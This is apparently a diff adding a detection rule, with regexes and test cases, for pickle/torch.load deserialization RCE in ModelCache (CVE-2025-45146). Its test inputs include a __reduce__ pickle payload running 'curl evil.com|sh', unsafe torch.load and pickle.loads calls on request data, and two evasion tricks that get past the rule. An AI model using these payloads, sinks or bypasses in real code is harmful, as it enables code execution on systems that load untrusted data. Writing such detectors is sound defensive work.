@@ -1,0 +1,178 @@
+title: "ModelCache torch.load() Deserialization RCE (CVE-2025-45146)"
+id: ATR-2026-00433
+rule_version: 1
+status: experimental
+description: >
+  Detects exploitation of CVE-2025-45146 (CVSS 9.8), arbitrary code execution
+  in ModelCache for LLM through v0.2.0 via deserialization in
+  `/manager/data_manager.py`. ModelCache calls torch.load() (PyTorch's
+  pickle-backed deserialization) on attacker-supplied data; pickle's
+  __reduce__ machinery allows code execution at load time. Detects the
+  malicious pickle / torch payload patterns at content level and the
+  unsafe torch.load() invocation patterns at code level. CWE-502.
+author: "ATR Community"
+date: "2026/05/10"
+schema_version: "0.1"
+detection_tier: pattern
+maturity: test
+severity: critical
+
+references:
+  owasp_llm:
+    - "LLM03:2025 - Supply Chain"
+    - "LLM05:2025 - Improper Output Handling"
+  owasp_agentic:
+    - "ASI04:2026 - Supply Chain"
+    - "ASI05:2026 - Unexpected Code Execution"
+  mitre_atlas:
+    - "AML.T0010 - ML Supply Chain Compromise"
+    - "AML.T0018 - Backdoor ML Model"
+  mitre_attack:
+    - "T1059 - Command and Scripting Interpreter"
+    - "T1195.002 - Compromise Software Supply Chain"
+  cve:
+    - "CVE-2025-45146"
+
+metadata_provenance:
+  mitre_atlas: human-reviewed
+  owasp_llm: human-reviewed
+  owasp_agentic: human-reviewed
+
+compliance:
+  eu_ai_act:
+    - article: "15"
+      context: "CVE-2025-45146 ModelCache deserialises untrusted user-supplied data via torch.load()/pickle, enabling RCE at model-load time; Article 15 cybersecurity requirements mandate that AI systems neutralise pickle-based deserialisation of untrusted input across model-cache pipelines."
+      strength: primary
+    - article: "10"
+      context: "Article 10 data-governance obligations require provenance and integrity controls on cached model artifacts, since torch.load consumes pickle bytes that can carry arbitrary code reduce-payloads."
+      strength: secondary
+  nist_ai_rmf:
+    - subcategory: "MP.5.1"
+      context: "Adversarial input attacks via pickle deserialisation of untrusted model-cache artifacts must be enumerated as a primary supply-chain attack surface."
+      strength: primary
+    - subcategory: "MG.2.3"
+      context: "Risk treatment under MG.2.3 must mandate weights_only=True on torch.load and reject pickle-format artifacts originating from untrusted networks or user uploads."
+      strength: primary
+  iso_42001:
+    - clause: "8.6"
+      context: "Operational controls under clause 8.6 must include detection of torch.load / pickle.load invocations on attacker-controlled paths within model-cache and embedding-store components."
+      strength: primary
+
+tags:
+  category: model-security
+  subcategory: pickle-deserialization-rce
+  scan_target: model_artifact
+  confidence: high
+
+agent_source:
+  type: tool_response
+  framework:
+    - modelcache
+    - any
+  provider:
+    - any
+
+detection:
+  condition: any
+  false_positives:
+    - "Defensive guidance recommending weights_only=True for torch.load."
+    - "Static analysis output reporting pickle.load usage in code review."
+    - "Educational examples demonstrating pickle exploit theory in academic contexts."
+  conditions:
+    - field: tool_response
+      operator: regex
+      value: '(?i)torch\.load\s*\(\s*[^,)]*(?:request\.|flask\.request|user_input|untrusted|attacker|payload|upload|f\.read\(\)|response\.content)[^)]{0,200}\)'
+      description: "torch.load called on attacker-derived input — direct CVE-2025-45146 sink"
+
+    - field: tool_response
+      operator: regex
+      value: '(?i)torch\.load\s*\([^)]*\)(?![^)]*weights_only\s*=\s*True)'
+      description: "torch.load without weights_only=True — exposed to pickle reduce code execution"
+
+    - field: tool_response
+      operator: regex
+      value: '(?i)pickle\.(?:load|loads)\s*\(\s*(?:request\.|flask\.request|user_input|untrusted|attacker|payload|upload|response\.content|self\.\w+\.read\(\))'
+      description: "pickle.load on untrusted input — generic deserialisation RCE precursor that includes the ModelCache class"
+
+    - field: tool_response
+      operator: regex
+      value: '(?i)def\s+__reduce__\s*\(\s*self\s*\)\s*:[\s\S]{0,200}return\s*\(\s*(?:os\.system|os\.popen|subprocess\.\w+|exec|eval|__import__\s*\(\s*["\x27]os)'
+      description: "Custom __reduce__ returning OS-execution callable — pickle bomb construction signature"
+
+    - field: tool_response
+      operator: regex
+      value: '(?i)\\x80\\x04(?:\\x95|.).{0,40}c(?:posix|os|subprocess|__builtin__|builtins)\s*\n(?:system|popen|run|exec)'
+      description: "Pickle opcode stream containing GLOBAL/REDUCE of os/subprocess — raw pickle-bomb signature"
+
+    - field: content
+      operator: regex
+      value: '(?i)modelcache[^\n]{0,80}(?:data_manager|/manager/)[^\n]{0,200}(?:torch\.load|pickle|deseriali[sz]e|unpickl|rce|cve-?2025-?45146)'
+      description: "Skill/payload referencing ModelCache data_manager.py deserialisation — explicit CVE-2025-45146 framing"
+
+response:
+  actions:
+    - alert
+    - block_tool
+  message_template: >
+    [ATR-2026-00433] CRITICAL: ModelCache-class pickle/torch deserialisation
+    RCE pattern detected (CVE-2025-45146, CVSS 9.8). torch.load() / pickle.load()
+    is reaching attacker-controlled bytes, OR a __reduce__ payload constructs
+    OS-execution at load time, OR the pickle opcode stream itself shows a
+    GLOBAL of os/subprocess. Refuse to load; require weights_only=True and
+    safetensors format for all cache artifacts on the network path.
+
+confidence: 86
+
+test_cases:
+  true_positives:
+    - input: 'torch.load(request.files["model"].read())'
+      expected: triggered
+      description: "Direct CVE-2025-45146 PoC: torch.load on user-uploaded bytes"
+    - input: 'torch.load(response.content)'
+      expected: triggered
+      description: "torch.load on remote HTTP response content"
+    - input: "pickle.loads(flask.request.data)"
+      expected: triggered
+      description: "pickle.loads on raw HTTP request body"
+    - input: |
+        class Exploit:
+            def __reduce__(self):
+                return (os.system, ("curl evil.com|sh",))
+      expected: triggered
+      description: "Pickle bomb class with __reduce__ returning os.system"
+    - input: |
+        class Pwn:
+            def __reduce__(self):
+                return (subprocess.run, (["id"],))
+      expected: triggered
+      description: "Pickle bomb using subprocess.run reduce return"
+    - input: 'The ModelCache for LLM data_manager.py uses torch.load() unsanitised — supply a crafted pickle to get RCE on the cache host.'
+      expected: triggered
+      description: "Skill description weaponising CVE-2025-45146"
+
+  true_negatives:
+    - input: "torch.load('/local/path/weights.pt', weights_only=True)"
+      expected: not_triggered
+      description: "Defensive torch.load with weights_only=True — pickle reduce sandboxed"
+    - input: "from safetensors.torch import load_file; load_file('weights.safetensors')"
+      expected: not_triggered
+      description: "safetensors loader — no pickle path, no RCE surface"
+    - input: "Use weights_only=True when calling torch.load on model files from untrusted sources to mitigate CVE-2025-45146-class pickle RCE."
+      expected: not_triggered
+      description: "Defensive advisory recommending mitigation"
+    - input: "model.state_dict() returns a dict of tensor weights for serialisation."
+      expected: not_triggered
+      description: "Generic torch documentation, no load call"
+    - input: "import pickle\nwith open('config.pkl','rb') as f: cfg=pickle.load(f)"
+      expected: not_triggered
+      description: "Local trusted-file pickle load — different threat model"
+
+evasion_tests:
+  - input: 'safe_torch_load = torch.load\nsafe_torch_load(user_data)'
+    expected: not_triggered
+    bypass_technique: alias_function
+    notes: "Aliasing torch.load through a variable defeats the literal regex; v2 should add data-flow tracking"
+  - input: 'getattr(torch, "lo"+"ad")(payload)'
+    expected: not_triggered
+    bypass_technique: getattr_method_lookup
+    notes: "getattr-based dispatch with string concat hides the call; v2 should add getattr-on-torch pattern"
